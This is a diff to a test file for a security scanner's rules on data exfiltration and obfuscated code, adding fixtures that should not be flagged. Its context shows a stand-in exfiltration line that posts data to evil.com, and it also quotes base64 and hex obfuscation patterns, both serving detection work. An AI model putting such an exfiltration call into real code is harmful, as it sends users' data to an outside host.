@@ -68,6 +68,41 @@ fetch('http://evil.com', { method: 'POST', body: data });
     expect(skl001.severity).toBe('critical');
     expect(skl001.category).toBe('skills');
   });
+
+  // ----- Negative false-positive fixtures -----
+
+  it('passes when a source is read but never forwarded to any sink', async () => {
+    await writeFile(join(tempDir, 'read-only.js'), `
+const fs = require('fs');
+const config = fs.readFileSync('./config.json', 'utf-8');
+console.log(config.length);
+`);
+    const result = await skl001.run(makeContext(tempDir));
+    expect(result.passed).toBe(true);
+  });
+
+  it('passes when a network call has no source variable as argument', async () => {
+    await writeFile(join(tempDir, 'fetch-only.js'), `
+async function ping() {
+  const r = await fetch('https://api.example.com/health');
+  return r.ok;
+}
+`);
+    const result = await skl001.run(makeContext(tempDir));
+    expect(result.passed).toBe(true);
+  });
+
+  it('passes when source variable is used only inside the program (no sink)', async () => {
+    await writeFile(join(tempDir, 'internal-use.js'), `
+const fs = require('fs');
+const data = fs.readFileSync('./data.json', 'utf-8');
+const parsed = JSON.parse(data);
+const total = parsed.items.length;
+console.log('total:', total);
+`);
+    const result = await skl001.run(makeContext(tempDir));
+    expect(result.passed).toBe(true);
+  });
 });
 
 describe('SKL-002: Obfuscated Code', () => {
@@ -113,6 +148,29 @@ const s = "\\x68\\x65\\x6c\\x6c\\x6f\\x2c\\x20\\x77\\x6f\\x72\\x6c\\x64";
 `);
     const result = await skl002.run(makeContext(tempDir));
     expect(result.passed).toBe(false);
+  });
+
+  // ----- Negative false-positive fixtures -----
+
+  it('passes for long but low-entropy URLs', async () => {
+    await writeFile(join(tempDir, 'urls.js'), `
+const A = 'https://api.example.com/v2/customers/list?page=1&limit=100&sort=name';
+const B = 'https://docs.example.com/reference/widgets/configuration-guide.html';
+`);
+    const result = await skl002.run(makeContext(tempDir));
+    expect(result.passed).toBe(true);
+  });
+
+  it('ignores obfuscation patterns inside line and JSDoc comments', async () => {
+    await writeFile(join(tempDir, 'doc.js'), `
+// Example of obfuscation: atob("ZXZpbA==") or Buffer.from(payload, "base64").
+/**
+ * Hex chain example: \\x68\\x65\\x6c\\x6c\\x6f
+ */
+function unrelated() { return 1; }
+`);
+    const result = await skl002.run(makeContext(tempDir));
+    expect(result.passed).toBe(true);
   });
 });
 
